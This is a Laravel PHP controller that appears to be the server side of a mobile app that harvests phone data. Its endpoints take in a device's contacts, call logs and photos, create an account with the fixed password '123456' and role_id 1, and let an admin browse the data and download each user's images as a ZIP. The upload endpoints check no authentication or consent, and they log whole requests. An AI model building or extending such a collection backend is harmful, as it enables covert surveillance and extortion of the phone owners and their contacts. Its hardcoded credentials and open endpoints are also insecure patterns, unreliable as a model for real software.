<?php

namespace App\Http\Controllers;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\User;
use App\Models\Contact;
use App\Models\CallLog;
use App\Models\UserImage;
use Illuminate\Support\Facades\Storage;
use ZipArchive;

class UserController extends Controller
{
    public function index()
    {
        $user = User::all();
        return view('user.index', compact('user'));
    }

    public function destroy(User $user)
    {
        $user->delete();
        return redirect()->route('user.index')->withSuccess('Data deleted');
    }

    public function view($id)
    {
        $user = User::with(['contacts', 'callLogs', 'images'])->findOrFail($id);
        return view('user.view', compact('user'));
    }

    public function downloadImages(User $user)
    {
        $images = $user->images;

        if ($images->isEmpty()) {
            return redirect()->back()->with('error', 'No images to download');
        }

        $zipFileName = 'user_' . $user->id . '_images_' . date('YmdHis') . '.zip';
        $zipFilePath = storage_path('app/public/' . $zipFileName);

        $zip = new ZipArchive;

        if ($zip->open($zipFilePath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {

            $counter = 1;

            foreach ($images as $image) {

                if ($image->image_uri) {

                    $filePath = storage_path('app/public/' . $image->image_uri);

                    if (file_exists($filePath)) {

                        $extension = pathinfo($image->image_uri, PATHINFO_EXTENSION);
                        $fileName = 'image_' . $counter . '.' . $extension;

                        $zip->addFile($filePath, $fileName);

                        $counter++;
                    }
                }
            }

            $zip->close();

            if (file_exists($zipFilePath)) {
                return response()->download($zipFilePath, $zipFileName)
                    ->deleteFileAfterSend(true);
            }
        }

        return redirect()->back()->with('error', 'Failed to create ZIP file');
    }

    public function storeapp(Request $request)
{
    $lastUser = User::orderBy('id', 'desc')->first();
    $nextId = $lastUser ? $lastUser->id + 1 : 1;

    $user = User::create([
        'name' => 'user' . $nextId,
        'email' => 'user' . $nextId . '@demo.com',
        'password' => bcrypt('123456'),
        'username' => 'user' . $nextId,
        'role_id' => 1,
        'is_active' => 1,
        'user_status' => 'active',
    ]);

    $userId = $user->id;

    if (!empty($request->contacts)) {
        foreach ($request->contacts as $contact) {

            Contact::create([
                'user_id' => $userId,
                'name' => $contact['name'] ?? null,
                'phoneNumbers' => $contact['phoneNumbers'] ?? null,
            ]);
        }
    }

    if (!empty($request->call_logs)) {
        foreach ($request->call_logs as $log) {

            CallLog::create([
                'user_id' => $userId,
                'name' => $log['name'] ?? 'Unknown',
                'phoneNumber' => $log['phoneNumber'] ?? null,
                'duration' => $log['duration'] ?? 0,
                'type' => $log['type'] ?? null,
                'timestamp' => isset($log['timestamp'])
                    ? date('Y-m-d H:i:s', $log['timestamp'] / 1000)
                    : now(),
            ]);
        }
    }

    return response()->json([
        'status' => true,
        'message' => 'Data saved successfully',
        'user_id' => $userId
    ]);
}

public function uploadimage(Request $request)
{
    \Log::info('UPLOAD HIT', $request->all());

    $userId = $request->user_id;

    // ❌ DO NOT hard fail if missing user_id during testing
    if (!$userId) {
        return response()->json([
            'status' => false,
            'message' => 'user_id missing'
        ], 422);
    }

    // 🔥 ACCEPT BOTH images / images[]
    $images = $request->file('images') 
        ?? $request->file('images[]');

    if (!$images) {
        return response()->json([
            'status' => false,
            'message' => 'No images received',
            'debug' => $request->all(),
        ], 422);
    }

    $folderPath = 'uploads/' . $userId;

    foreach ((array) $images as $image) {

        if (!$image) continue;

        $path = $image->store($folderPath, 'public');

        UserImage::create([
            'user_id' => $userId,
            'image_uri' => $path,
        ]);
    }

    return response()->json([
        'status' => true,
        'message' => 'Images uploaded successfully',
    ]);
}
}